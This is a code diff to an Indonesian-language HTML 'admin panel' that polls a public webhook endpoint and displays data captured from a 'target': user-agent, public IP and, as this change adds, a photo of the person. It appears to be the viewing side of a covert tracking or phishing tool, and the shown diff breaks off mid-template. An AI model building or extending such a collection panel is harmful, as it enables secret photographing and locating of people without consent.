@@ -6,22 +6,26 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
 body{background:#111;color:#eee;font-family:Arial,Helvetica,sans-serif;text-align:center;padding:20px}
+img{max-width:100%;border-radius:8px}
 #log{margin-top:20px;text-align:left;display:inline-block;background:#222;padding:15px;border-radius:6px;max-width:90%;white-space:pre-wrap}
 </style>
 </head>
 <body>
-<h2>Admin Panel - Data Target</h2>
+<h2>Admin Panel - Foto & Data Target</h2>
+<img id="pic" style="display:none">
 <div id="log">Menunggu data...</div>
 
 <script>
-const WEBHOOK_URL = 'https://usewebhook.com/f06bc9bdb93468dc3259a91fcf2cdf12'; // <== GANTI SAMA URL ANDA
+const WEBHOOK_URL = 'https://usewebhook.com/f06bc9bdb93468dc3259a91fcf2cdf12'; // ganti
 async function poll(){
   try{
-    const r = await fetch(WEBHOOK_URL+'.json'); // endpoint JSON public
+    const r = await fetch(WEBHOOK_URL+'.json');
     if(!r.ok) return;
     const arr = await r.json();
     if(!arr.length) return;
-    const latest = arr[arr.length-1]; // ambil request terakhir
+    const latest = arr[arr.length-1];
+    document.getElementById('pic').src = latest.body.foto;
+    document.getElementById('pic').style.display = 'block';
     document.getElementById('log').textContent =
       `User-Agent : ${latest.headers['user-agent']}\n`+
       `IP Publik  : ${latest.body.ip}\n`+
